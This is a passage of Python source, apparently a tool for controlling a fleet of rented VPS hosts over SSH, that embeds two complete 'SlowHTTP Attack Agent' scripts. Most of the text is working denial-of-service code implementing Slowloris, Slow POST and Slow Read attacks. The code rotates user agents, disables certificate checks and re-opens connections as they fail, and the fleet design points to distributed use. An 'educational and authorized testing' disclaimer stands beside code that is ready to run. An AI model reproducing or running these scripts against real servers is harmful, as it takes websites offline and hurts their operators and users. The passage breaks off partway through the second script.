            printf '"memory_total":"%s",' "$mem_total_val"
            printf '"memory_used":"%s",' "$mem_used_val"
            printf '"disk_total":"%s",' "$disk_total_val"
            printf '"disk_used":"%s",' "$disk_used_val"
            printf '"python_version":"%s",' "$python_ver_val"
            printf '"uptime":"%s"' "$uptime_val"
            printf '}\n'
            BASH
            """)
            # Windows CRLF suka bikin heredoc halu
            cmd = cmd.replace('\r\n', '\n')
            if not cmd.endswith('\n'):
                cmd += '\n'
            
            success, output = self.execute_command(ip, cmd, timeout=20)
            if not success:
                return None
            try:
                return json.loads(output.strip())
            except json.JSONDecodeError:
                logger.error(f"Failed to parse system info from {ip}: {output}")
                return None
        except Exception as e:
            logger.error(f"Error getting system info from {ip}: {str(e)}")
            return None
    
    def get_connection_status(self, ip):
        """Check if connection to VPS is active and working"""
        if ip not in self.connections:
            return False
        
        try:
            transport = self.connections[ip].get_transport()
            if transport and transport.is_active():
                return True
            else:
                # Remove inactive connection
                if ip in self.connections:
                    try:
                        self.connections[ip].close()
                    except:
                        pass
                    del self.connections[ip]
                return False
        except:
            # Remove broken connection
            if ip in self.connections:
                try:
                    self.connections[ip].close()
                except:
                    pass
                del self.connections[ip]
            return False
    
    def _get_standard_agent_script(self):
        """Get the standard agent script for slowloris and slow POST attacks"""
        return '''#!/usr/bin/env python3
"""
SlowHTTP Attack Agent - Standard Edition
For educational and authorized testing purposes only
"""

import socket
import random
import time
import sys
import argparse
import ssl
import os
import signal
import threading
import json
from urllib.parse import urlparse

# VERSION moved to top of file - removed duplicate

class SlowHTTPAttacker:
    def __init__(self, target, port=80, use_ssl=False, user_agent=None, path="/"):
        self.target = target
        self.port = port
        self.use_ssl = use_ssl
        self.path = path
        self.running = False
        self.connections = []
        self.lock = threading.Lock()
        self.stats = {
            "connections_active": 0,
            "packets_sent": 0,
            "bytes_sent": 0,
            "error_count": 0,
            "response_codes": {}
        }
        
        # Generate random user agent if not provided
        if not user_agent:
            user_agents = [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 11.5; rv:90.0) Gecko/20100101 Firefox/90.0",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_5_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15"
            ]
            self.user_agent = random.choice(user_agents)
        else:
            self.user_agent = user_agent
    
    def slowloris_attack(self, num_connections, delay, duration):
        """Slowloris (Keep-Alive) attack"""
        self.running = True
        self.connections = []
        self.stats = {
            "connections_active": 0,
            "packets_sent": 0,
            "bytes_sent": 0,
            "error_count": 0,
            "response_codes": {}
        }
        
        print(f"[*] Starting Slowloris attack on {self.target}:{self.port}")
        print(f"[*] Connections: {num_connections}, Delay: {delay}s, Duration: {duration}s")
        
        # Set up signal handler for graceful shutdown
        def signal_handler(sig, frame):
            print("\\n[!] Stopping attack...")
            self.stop_attack()
        
        signal.signal(signal.SIGINT, signal_handler)
        
        # Start timer for duration
        end_time = time.time() + duration
        
        try:
            # Create initial connections
            for i in range(num_connections):
                if not self.running:
                    break
                
                try:
                    # Create socket
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(5)
                    
                    # Connect to target
                    s.connect((self.target, self.port))
                    
                    # Wrap with SSL if needed
                    if self.use_ssl:
                        context = ssl.create_default_context()
                        context.check_hostname = False
                        context.verify_mode = ssl.CERT_NONE
                        s = context.wrap_socket(s, server_hostname=self.target)
                    
                    # Send initial HTTP request headers (incomplete)
                    request = f"GET {self.path} HTTP/1.1\\r\\n"
                    request += f"Host: {self.target}\\r\\n"
                    request += f"User-Agent: {self.user_agent}\\r\\n"
                    request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\n"
                    request += "Accept-Language: en-US,en;q=0.5\\r\\n"
                    request += "Accept-Encoding: gzip, deflate\\r\\n"
                    request += "Connection: keep-alive\\r\\n"
                    request += "Cache-Control: no-cache\\r\\n"
                    
                    # Send initial headers
                    s.send(request.encode())
                    
                    # Update stats
                    with self.lock:
                        self.stats["connections_active"] += 1
                        self.stats["packets_sent"] += 1
                        self.stats["bytes_sent"] += len(request)
                    
                    # Add to connections list
                    self.connections.append(s)
                    
                    # Sleep briefly between connections
                    if i % 100 == 0:
                        time.sleep(0.1)
                        
                except Exception as e:
                    with self.lock:
                        self.stats["error_count"] += 1
                    if i % 100 == 0:
                        print(f"[!] Error creating connection {i}: {str(e)}")
            
            print(f"[*] Established {len(self.connections)} connections")
            
            # Keep connections alive by sending partial headers
            while time.time() < end_time and self.running:
                for i, s in enumerate(list(self.connections)):
                    try:
                        # Send a partial header to keep connection alive
                        partial_header = f"X-a: {random.randint(1, 5000)}\\r\\n"
                        s.send(partial_header.encode())
                        
                        # Update stats
                        with self.lock:
                            self.stats["packets_sent"] += 1
                            self.stats["bytes_sent"] += len(partial_header)
                            
                    except Exception as e:
                        # Connection closed or error, remove it
                        with self.lock:
                            self.stats["connections_active"] -= 1
                            self.stats["error_count"] += 1
                        
                        try:
                            self.connections.remove(s)
                        except:
                            pass
                        
                        # Try to create a new connection
                        try:
                            # Create socket
                            new_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            new_s.settimeout(5)
                            
                            # Connect to target
                            new_s.connect((self.target, self.port))
                            
                            # Wrap with SSL if needed
                            if self.use_ssl:
                                context = ssl.create_default_context()
                                context.check_hostname = False
                                context.verify_mode = ssl.CERT_NONE
                                new_s = context.wrap_socket(new_s, server_hostname=self.target)
                            
                            # Send initial HTTP request headers (incomplete)
                            request = f"GET {self.path} HTTP/1.1\\r\\n"
                            request += f"Host: {self.target}\\r\\n"
                            request += f"User-Agent: {self.user_agent}\\r\\n"
                            request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\n"
                            request += "Accept-Language: en-US,en;q=0.5\\r\\n"
                            request += "Accept-Encoding: gzip, deflate\\r\\n"
                            request += "Connection: keep-alive\\r\\n"
                            request += "Cache-Control: no-cache\\r\\n"
                            
                            # Send initial headers
                            new_s.send(request.encode())
                            
                            # Update stats
                            with self.lock:
                                self.stats["connections_active"] += 1
                                self.stats["packets_sent"] += 1
                                self.stats["bytes_sent"] += len(request)
                            
                            # Add to connections list
                            self.connections.append(new_s)
                            
                        except Exception:
                            # Failed to create new connection, just continue
                            pass
                
                # Print status update
                print(f"[*] Status: {len(self.connections)} connections active, {self.stats['packets_sent']} packets sent")
                
                # Sleep before sending more headers
                time.sleep(delay)
        
        finally:
            # Clean up
            self.stop_attack()
            print("[*] Attack completed")
    
    def slow_post_attack(self, num_connections, delay, duration):
        """Slow POST attack (R.U.D.Y)"""
        self.running = True
        self.connections = []
        self.stats = {
            "connections_active": 0,
            "packets_sent": 0,
            "bytes_sent": 0,
            "error_count": 0,
            "response_codes": {}
        }
        
        print(f"[*] Starting Slow POST attack on {self.target}:{self.port}")
        print(f"[*] Connections: {num_connections}, Delay: {delay}s, Duration: {duration}s")
        
        # Set up signal handler for graceful shutdown
        def signal_handler(sig, frame):
            print("\\n[!] Stopping attack...")
            self.stop_attack()
        
        signal.signal(signal.SIGINT, signal_handler)
        
        # Start timer for duration
        end_time = time.time() + duration
        
        try:
            # Generate a random large content length
            content_length = random.randint(10000000, 1000000000)
            
            # Create initial connections
            for i in range(num_connections):
                if not self.running:
                    break
                
                try:
                    # Create socket
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(5)
                    
                    # Connect to target
                    s.connect((self.target, self.port))
                    
                    # Wrap with SSL if needed
                    if self.use_ssl:
                        context = ssl.create_default_context()
                        context.check_hostname = False
                        context.verify_mode = ssl.CERT_NONE
                        s = context.wrap_socket(s, server_hostname=self.target)
                    
                    # Send initial HTTP POST request headers
                    request = f"POST {self.path} HTTP/1.1\\r\\n"
                    request += f"Host: {self.target}\\r\\n"
                    request += f"User-Agent: {self.user_agent}\\r\\n"
                    request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\n"
                    request += "Accept-Language: en-US,en;q=0.5\\r\\n"
                    request += "Accept-Encoding: gzip, deflate\\r\\n"
                    request += "Connection: keep-alive\\r\\n"
                    request += "Content-Type: application/x-www-form-urlencoded\\r\\n"
                    request += f"Content-Length: {content_length}\\r\\n"
                    request += "\\r\\n"
                    
                    # Send initial headers
                    s.send(request.encode())
                    
                    # Update stats
                    with self.lock:
                        self.stats["connections_active"] += 1
                        self.stats["packets_sent"] += 1
                        self.stats["bytes_sent"] += len(request)
                    
                    # Add to connections list
                    self.connections.append(s)
                    
                    # Sleep briefly between connections
                    if i % 100 == 0:
                        time.sleep(0.1)
                        
                except Exception as e:
                    with self.lock:
                        self.stats["error_count"] += 1
                    if i % 100 == 0:
                        print(f"[!] Error creating connection {i}: {str(e)}")
            
            print(f"[*] Established {len(self.connections)} connections")
            
            # Send POST data very slowly
            while time.time() < end_time and self.running:
                for i, s in enumerate(list(self.connections)):
                    try:
                        # Send a small piece of POST data
                        data_chunk = f"{random.choice('abcdefghijklmnopqrstuvwxyz')}="
                        s.send(data_chunk.encode())
                        
                        # Update stats
                        with self.lock:
                            self.stats["packets_sent"] += 1
                            self.stats["bytes_sent"] += len(data_chunk)
                            
                    except Exception as e:
                        # Connection closed or error, remove it
                        with self.lock:
                            self.stats["connections_active"] -= 1
                            self.stats["error_count"] += 1
                        
                        try:
                            self.connections.remove(s)
                        except:
                            pass
                        
                        # Try to create a new connection
                        try:
                            # Create socket
                            new_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            new_s.settimeout(5)
                            
                            # Connect to target
                            new_s.connect((self.target, self.port))
                            
                            # Wrap with SSL if needed
                            if self.use_ssl:
                                context = ssl.create_default_context()
                                context.check_hostname = False
                                context.verify_mode = ssl.CERT_NONE
                                new_s = context.wrap_socket(new_s, server_hostname=self.target)
                            
                            # Send initial HTTP POST request headers
                            request = f"POST {self.path} HTTP/1.1\\r\\n"
                            request += f"Host: {self.target}\\r\\n"
                            request += f"User-Agent: {self.user_agent}\\r\\n"
                            request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\n"
                            request += "Accept-Language: en-US,en;q=0.5\\r\\n"
                            request += "Accept-Encoding: gzip, deflate\\r\\n"
                            request += "Connection: keep-alive\\r\\n"
                            request += "Content-Type: application/x-www-form-urlencoded\\r\\n"
                            request += f"Content-Length: {content_length}\\r\\n"
                            request += "\\r\\n"
                            
                            # Send initial headers
                            new_s.send(request.encode())
                            
                            # Update stats
                            with self.lock:
                                self.stats["connections_active"] += 1
                                self.stats["packets_sent"] += 1
                                self.stats["bytes_sent"] += len(request)
                            
                            # Add to connections list
                            self.connections.append(new_s)
                            
                        except Exception:
                            # Failed to create new connection, just continue
                            pass
                
                # Print status update
                print(f"[*] Status: {len(self.connections)} connections active, {self.stats['packets_sent']} packets sent")
                
                # Sleep before sending more data
                time.sleep(delay)
        
        finally:
            # Clean up
            self.stop_attack()
            print("[*] Attack completed")
    
    def slow_read_attack(self, num_connections, delay, duration):
        """Slow Read attack"""
        self.running = True
        self.connections = []
        self.stats = {
            "connections_active": 0,
            "packets_sent": 0,
            "bytes_sent": 0,
            "error_count": 0,
            "response_codes": {}
        }
        
        print(f"[*] Starting Slow Read attack on {self.target}:{self.port}")
        print(f"[*] Connections: {num_connections}, Delay: {delay}s, Duration: {duration}s")
        
        # Set up signal handler for graceful shutdown
        def signal_handler(sig, frame):
            print("\\n[!] Stopping attack...")
            self.stop_attack()
        
        signal.signal(signal.SIGINT, signal_handler)
        
        # Start timer for duration
        end_time = time.time() + duration
        
        try:
            # Create initial connections
            for i in range(num_connections):
                if not self.running:
                    break
                
                try:
                    # Create socket
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(10)  # Longer timeout for slow read
                    
                    # Set a very small receive buffer
                    s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 1)
                    
                    # Connect to target
                    s.connect((self.target, self.port))
                    
                    # Wrap with SSL if needed
                    if self.use_ssl:
                        context = ssl.create_default_context()
                        context.check_hostname = False
                        context.verify_mode = ssl.CERT_NONE
                        s = context.wrap_socket(s, server_hostname=self.target)
                    
                    # Send complete HTTP request with small window size
                    request = f"GET {self.path} HTTP/1.1\\r\\n"
                    request += f"Host: {self.target}\\r\\n"
                    request += f"User-Agent: {self.user_agent}\\r\\n"
                    request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\n"
                    request += "Accept-Language: en-US,en;q=0.5\\r\\n"
                    request += "Accept-Encoding: gzip, deflate\\r\\n"
                    request += "Connection: keep-alive\\r\\n"
                    # Add a very small window size
                    request += "X-Requested-With: XMLHttpRequest\\r\\n"
                    request += "\\r\\n"
                    
                    # Send request
                    s.send(request.encode())
                    
                    # Update stats
                    with self.lock:
                        self.stats["connections_active"] += 1
                        self.stats["packets_sent"] += 1
                        self.stats["bytes_sent"] += len(request)
                    
                    # Add to connections list
                    self.connections.append(s)
                    
                    # Sleep briefly between connections
                    if i % 100 == 0:
                        time.sleep(0.1)
                        
                except Exception as e:
                    with self.lock:
                        self.stats["error_count"] += 1
                    if i % 100 == 0:
                        print(f"[!] Error creating connection {i}: {str(e)}")
            
            print(f"[*] Established {len(self.connections)} connections")
            
            # Read data very slowly
            while time.time() < end_time and self.running:
                for i, s in enumerate(list(self.connections)):
                    try:
                        # Read a tiny amount of data
                        try:
                            s.recv(1)
                        except socket.timeout:
                            # Timeout is expected and good for slow read
                            pass
                            
                    except Exception as e:
                        if not isinstance(e, socket.timeout):
                            # Connection closed or error (not timeout), remove it
                            with self.lock:
                                self.stats["connections_active"] -= 1
                                self.stats["error_count"] += 1
                            
                            try:
                                self.connections.remove(s)
                            except:
                                pass
                            
                            # Try to create a new connection
                            try:
                                # Create socket
                                new_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                                new_s.settimeout(10)  # Longer timeout for slow read
                                
                                # Set a very small receive buffer
                                new_s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 1)
                                
                                # Connect to target
                                new_s.connect((self.target, self.port))
                                
                                # Wrap with SSL if needed
                                if self.use_ssl:
                                    context = ssl.create_default_context()
                                    context.check_hostname = False
                                    context.verify_mode = ssl.CERT_NONE
                                    new_s = context.wrap_socket(new_s, server_hostname=self.target)
                                
                                # Send complete HTTP request with small window size
                                request = f"GET {self.path} HTTP/1.1\\r\\n"
                                request += f"Host: {self.target}\\r\\n"
                                request += f"User-Agent: {self.user_agent}\\r\\n"
                                request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\n"
                                request += "Accept-Language: en-US,en;q=0.5\\r\\n"
                                request += "Accept-Encoding: gzip, deflate\\r\\n"
                                request += "Connection: keep-alive\\r\\n"
                                # Add a very small window size
                                request += "X-Requested-With: XMLHttpRequest\\r\\n"
                                request += "\\r\\n"
                                
                                # Send request
                                new_s.send(request.encode())
                                
                                # Update stats
                                with self.lock:
                                    self.stats["connections_active"] += 1
                                    self.stats["packets_sent"] += 1
                                    self.stats["bytes_sent"] += len(request)
                                
                                # Add to connections list
                                self.connections.append(new_s)
                                
                            except Exception:
                                # Failed to create new connection, just continue
                                pass
                
                # Print status update
                print(f"[*] Status: {len(self.connections)} connections active, {self.stats['packets_sent']} packets sent")
                
                # Sleep before reading more data
                time.sleep(delay)
        
        finally:
            # Clean up
            self.stop_attack()
            print("[*] Attack completed")
    
    def stop_attack(self):
        """Stop the attack and clean up connections"""
        self.running = False
        
        # Close all connections
        for s in self.connections:
            try:
                s.close()
            except:
                pass
        
        self.connections = []
        
        # Final stats update
        with self.lock:
            self.stats["connections_active"] = 0
        
        print(f"[*] Attack stopped. Final stats: {json.dumps(self.stats)}")

def main():
    parser = argparse.ArgumentParser(description="SlowHTTP Attack Agent")
    parser.add_argument("--target", help="Target hostname or IP")
    parser.add_argument("--port", type=int, default=80, help="Target port (default: 80)")
    parser.add_argument("--ssl", action="store_true", help="Use SSL/TLS")
    parser.add_argument("--path", default="/", help="Target path (default: /)")
    parser.add_argument("--attack-type", choices=["slowloris", "slow_post", "slow_read"], default="slowloris", help="Attack type")
    parser.add_argument("--connections", type=int, default=150, help="Number of connections (default: 150)")
    parser.add_argument("--delay", type=float, default=15, help="Delay between packets in seconds (default: 15)")
    parser.add_argument("--duration", type=int, default=300, help="Attack duration in seconds (default: 300)")
    parser.add_argument("--version", action="store_true", help="Show version and exit")
    
    args = parser.parse_args()
    
    if args.version:
        print(f"SlowHTTP Attack Agent v{VERSION}")
        sys.exit(0)
    
    if not args.target:
        parser.print_help()
        sys.exit(1)
    
    # Parse URL if full URL is provided
    if args.target.startswith(("http://", "https://")):
        parsed_url = urlparse(args.target)
        target_host = parsed_url.netloc
        use_ssl = args.target.startswith("https://")
        path = parsed_url.path if parsed_url.path else "/"
        port = parsed_url.port or (443 if use_ssl else 80)
    else:
        target_host = args.target
        use_ssl = args.ssl
        path = args.path
        port = args.port
    
    # Create attacker
    attacker = SlowHTTPAttacker(target_host, port, use_ssl, path=path)
    
    try:
        # Launch attack based on type
        if args.attack_type == "slowloris":
            attacker.slowloris_attack(args.connections, args.delay, args.duration)
        elif args.attack_type == "slow_post":
            attacker.slow_post_attack(args.connections, args.delay, args.duration)
        elif args.attack_type == "slow_read":
            attacker.slow_read_attack(args.connections, args.delay, args.duration)
    except KeyboardInterrupt:
        print("\\n[INTERRUPTED] Stopping attack...")
        attacker.stop_attack()
    except Exception as e:
        print(f"[ERROR] {str(e)}")
        attacker.stop_attack()
    finally:
        print("[CLEANUP] Attack completed")

if __name__ == "__main__":
    main()
'''
    
    def _get_advanced_agent_script(self):
        """Get the advanced agent script with additional attack methods"""
        return '''#!/usr/bin/env python3
"""
SlowHTTP Attack Agent - Advanced Edition
For educational and authorized testing purposes only
"""

import socket
import random
import time
import sys
import argparse
import ssl
import os
import signal
import threading
import json
import struct
from urllib.parse import urlparse
import select

# VERSION moved to top of file - removed duplicate

class AdvancedHTTPAttacker:
    def __init__(self, target, port=80, use_ssl=False, user_agent=None, path="/"):
        self.target = target
        self.port = port
        self.use_ssl = use_ssl
        self.path = path
        self.running = False
        self.connections = []
        self.lock = threading.Lock()
        self.stats = {
            "connections_active": 0,
            "packets_sent": 0,
            "bytes_sent": 0,
            "error_count": 0,
            "response_codes": {}
        }
        
        # Generate random user agent if not provided
        if not user_agent:
            user_agents = [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 11.5; rv:90.0) Gecko/20100101 Firefox/90.0",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_5_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15"
            ]
            self.user_agent = random.choice(user_agents)
        else:
            self.user_agent = user_agent
    
    def slowloris_attack(self, num_connections, delay, duration):
        """Slowloris (Keep-Alive) attack"""
        self.running = True
        self.connections = []
        self.stats = {
            "connections_active": 0,
            "packets_sent": 0,
            "bytes_sent": 0,
            "error_count": 0,
            "response_codes": {}
        }
        
        print(f"[*] Starting Slowloris attack on {self.target}:{self.port}")
        print(f"[*] Connections: {num_connections}, Delay: {delay}s, Duration: {duration}s")
        
        # Set up signal handler for graceful shutdown
        def signal_handler(sig, frame):
            print("\\n[!] Stopping attack...")
            self.stop_attack()
        
        signal.signal(signal.SIGINT, signal_handler)
        
        # Start timer for duration
        end_time = time.time() + duration
        
        try:
            # Create initial connections
            for i in range(num_connections):
                if not self.running:
                    break
                
                try:
                    # Create socket
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(5)
                    
                    # Connect to target
                    s.connect((self.target, self.port))
                    
                    # Wrap with SSL if needed
                    if self.use_ssl:
                        context = ssl.create_default_context()
                        context.check_hostname = False
                        context.verify_mode = ssl.CERT_NONE
                        s = context.wrap_socket(s, server_hostname=self.target)
                    
                    # Send initial HTTP request headers (incomplete)
                    request = f"GET {self.path} HTTP/1.1\\r\\n"
                    request += f"Host: {self.target}\\r\\n"
                    request += f"User-Agent: {self.user_agent}\\r\\n"
                    request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\n"
                    request += "Accept-Language: en-US,en;q=0.5\\r\\n"
                    request += "Accept-Encoding: gzip, deflate\\r\\n"
                    request += "Connection: keep-alive\\r\\n"
                    request += "Cache-Control: no-cache\\r\\n"
                    
                    # Send initial headers
                    s.send(request.encode())
                    
                    # Update stats
                    with self.lock:
                        self.stats["connections_active"] += 1
                        self.stats["packets_sent"] += 1
                        self.stats["bytes_sent"] += len(request)
                    
                    # Add to connections list
                    self.connections.append(s)
                    
                    # Sleep briefly between connections
                    if i % 100 == 0:
                        time.sleep(0.1)
                        
                except Exception as e:
                    with self.lock:
                        self.stats["error_count"] += 1
                    if i % 100 == 0:
                        print(f"[!] Error creating connection {i}: {str(e)}")
            
            print(f"[*] Established {len(self.connections)} connections")
            
            # Keep connections alive by sending partial headers
            while time.time() < end_time and self.running:
                for i, s in enumerate(list(self.connections)):
                    try:
                        # Send a partial header to keep connection alive
                        partial_header = f"X-a: {random.randint(1, 5000)}\\r\\n"
                        s.send(partial_header.encode())
                        
                        # Update stats
                        with self.lock:
                            self.stats["packets_sent"] += 1
                            self.stats["bytes_sent"] += len(partial_header)
                            
                    except Exception as e:
                        # Connection closed or error, remove it
                        with self.lock:
                            self.stats["connections_active"] -= 1
                            self.stats["error_count"] += 1
                        
                        try:
                            self.connections.remove(s)
                        except:
                            pass
                        
                        # Try to create a new connection
                        try:
                            # Create socket
                            new_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            new_s.settimeout(5)
                            
                            # Connect to target
                            new_s.connect((self.target, self.port))
                            
                            # Wrap with SSL if needed
                            if self.use_ssl:
                                context = ssl.create_default_context()
                                context.check_hostname = False
                                context.verify_mode = ssl.CERT_NONE
                                new_s = context.wrap_socket(new_s, server_hostname=self.target)
                            
                            # Send initial HTTP request headers (incomplete)
                            request = f"GET {self.path} HTTP/1.1\\r\\n"
                            request += f"Host: {self.target}\\r\\n"
                            request += f"User-Agent: {self.user_agent}\\r\\n"
                            request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\n"
                            request += "Accept-Language: en-US,en;q=0.5\\r\\n"
                            request += "Accept-Encoding: gzip, deflate\\r\\n"
                            request += "Connection: keep-alive\\r\\n"
                            request += "Cache-Control: no-cache\\r\\n"
                            
                            # Send initial headers
                            new_s.send(request.encode())
                            
                            # Update stats
                            with self.lock:
                                self.stats["connections_active"] += 1
                                self.stats["packets_sent"] += 1
                                self.stats["bytes_sent"] += len(request)
                            
                            # Add to connections list
                            self.connections.append(new_s)
                            
                        except Exception:
                            # Failed to create new connection, just continue
                            pass
                
                # Print status update
                print(f"[*] Status: {len(self.connections)} connections active, {self.stats['packets_sent']} packets sent")
                
                # Sleep before sending more headers
                time.sleep(delay)
        
        finally:
            # Clean up
            self.stop_attack()
            print("[*] Attack completed")
    
    def slow_post_attack(self, num_connections, delay, duration):
        """Slow POST attack (R.U.D.Y)"""
        self.running = True
        self.connections = []
        self.stats = {
            "connections_active": 0,
            "packets_sent": 0,
            "bytes_sent": 0,
            "error_count": 0,
            "response_codes": {}
        }
        
        print(f"[*] Starting Slow POST attack on {self.target}:{self.port}")
        print(f"[*] Connections: {num_connections}, Delay: {delay}s, Duration: {duration}s")
        
        # Set up signal handler for graceful shutdown
        def signal_handler(sig, frame):
            print("\\n[!] Stopping attack...")
            self.stop_attack()
        
        signal.signal(signal.SIGINT, signal_handler)
        
        # Start timer for duration
        end_time = time.time() + duration
        
        try:
            # Generate a random large content length
            content_length = random.randint(10000000, 1000000000)
            
            # Create initial connections
            for i in range(num_connections):
                if not self.running:
                    break
                
                try:
                    # Create socket
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(5)
                    
                    # Connect to target
                    s.connect((self.target, self.port))
                    
                    # Wrap with SSL if needed
                    if self.use_ssl:
                        context = ssl.create_default_context()
                        context.check_hostname = False
                        context.verify_mode = ssl.CERT_NONE
                        s = context.wrap_socket(s, server_hostname=self.target)
                    
                    # Send initial HTTP POST request headers
                    request = f"POST {self.path} HTTP/1.1\\r\\n"
                    request += f"Host: {self.target}\\r\\n"
                    request += f"User-Agent: {self.user_agent}\\r\\n"
                    request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\n"
                    request += "Accept-Language: en-US,en;q=0.5\\r\\n"
                    request += "Accept-Encoding: gzip, deflate\\r\\n"
                    request += "Connection: keep-alive\\r\\n"
                    request += "Content-Type: application/x-www-form-urlencoded\\r\\n"
                    request += f"Content-Length: {content_length}\\r\\n"
                    request += "\\r\\n"
                    
                    # Send initial headers
                    s.send(request.encode())
                    
                    # Update stats
                    with self.lock:
                        self.stats["connections_active"] += 1
                        self.stats["packets_sent"] += 1
                        self.stats["bytes_sent"] += len(request)
                    
                    # Add to connections list
                    self.connections.append(s)
                    
                    # Sleep briefly between connections
                    if i % 100 == 0:
                        time.sleep(0.1)
                        
                except Exception as e:
                    with self.lock:
                        self.stats["error_count"] += 1
                    if i % 100 == 0:
                        print(f"[!] Error creating connection {i}: {str(e)}")
            
            print(f"[*] Established {len(self.connections)} connections")
            
            # Send POST data very slowly
            while time.time() < end_time and self.running:
                for i, s in enumerate(list(self.connections)):
                    try:
                        # Send a small piece of POST data
                        data_chunk = f"{random.choice('abcdefghijklmnopqrstuvwxyz')}="
                        s.send(data_chunk.encode())
                        
                        # Update stats
                        with self.lock:
                            self.stats["packets_sent"] += 1
                            self.stats["bytes_sent"] += len(data_chunk)
                            
                    except Exception as e:
                        # Connection closed or error, remove it
                        with self.lock:
                            self.stats["connections_active"] -= 1
                            self.stats["error_count"] += 1
                        
                        try:
                            self.connections.remove(s)
                        except:
                            pass
                        
                        # Try to create a new connection
                        try:
                            # Create socket
                            new_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            new_s.settimeout(5)
                            
                            # Connect to target
                            new_s.connect((self.target, self.port))
                            
                            # Wrap with SSL if needed
                            if self.use_ssl:
                                context = ssl.create_default_context()
                                context.check_hostname = False
                                context.verify_mode = ssl.CERT_NONE
                                new_s = context.wrap_socket(new_s, server_hostname=self.target)
                            
                            # Send initial HTTP POST request headers
                            request = f"POST {self.path} HTTP/1.1\\r\\n"
                            request += f"Host: {self.target}\\r\\n"
                            request += f"User-Agent: {self.user_agent}\\r\\n"
                            request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\n"
                            request += "Accept-Language: en-US,en;q=0.5\\r\\n"
                            request += "Accept-Encoding: gzip, deflate\\r\\n"
                            request += "Connection: keep-alive\\r\\n"
                            request += "Content-Type: application/x-www-form-urlencoded\\r\\n"
                            request += f"Content-Length: {content_length}\\r\\n"
                            request += "\\r\\n"
                            
                            # Send initial headers
                            new_s.send(request.encode())
                            
                            # Update stats
                            with self.lock:
                                self.stats["connections_active"] += 1
                                self.stats["packets_sent"] += 1
                                self.stats["bytes_sent"] += len(request)
                            
                            # Add to connections list
                            self.connections.append(new_s)
                            
                        except Exception:
                            # Failed to create new connection, just continue
                            pass
                
                # Print status update
                print(f"[*] Status: {len(self.connections)} connections active, {self.stats['packets_sent']} packets sent")
                
                # Sleep before sending more data
                time.sleep(delay)
        
        finally:
            # Clean up
            self.stop_attack()
            print("[*] Attack completed")
    
    def slow_read_attack(self, num_connections, delay, duration):
        """Slow Read attack"""
        self.running = True
        self.connections = []
        self.stats = {
            "connections_active": 0,
            "packets_sent": 0,
            "bytes_sent": 0,
            "error_count": 0,
            "response_codes": {}
        }
        
        print(f"[*] Starting Slow Read attack on {self.target}:{self.port}")
        print(f"[*] Connections: {num_connections}, Delay: {delay}s, Duration: {duration}s")
        
        # Set up signal handler for graceful shutdown
        def signal_handler(sig, frame):
            print("\\n[!] Stopping attack...")
            self.stop_attack()
        
        signal.signal(signal.SIGINT, signal_handler)
        
        # Start timer for duration
        end_time = time.time() + duration
        
        try:
            # Create initial connections
            for i in range(num_connections):
                if not self.running:
                    break
                
                try:
                    # Create socket
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(10)  # Longer timeout for slow read
                    
                    # Set a very small receive buffer
                    s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 1)
                    
                    # Connect to target
                    s.connect((self.target, self.port))
                    
                    # Wrap with SSL if needed
                    if self.use_ssl:
                        context = ssl.create_default_context()
                        context.check_hostname = False
                        context.verify_mode = ssl.CERT_NONE
                        s = context.wrap_socket(s, server_hostname=self.target)
                    
                    # Send complete HTTP request with small window size
                    request = f"GET {self.path} HTTP/1.1\\r\\n"
                    request += f"Host: {self.target}\\r\\n"
                    request += f"User-Agent: {self.user_agent}\\r\\n"
                    request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\n"
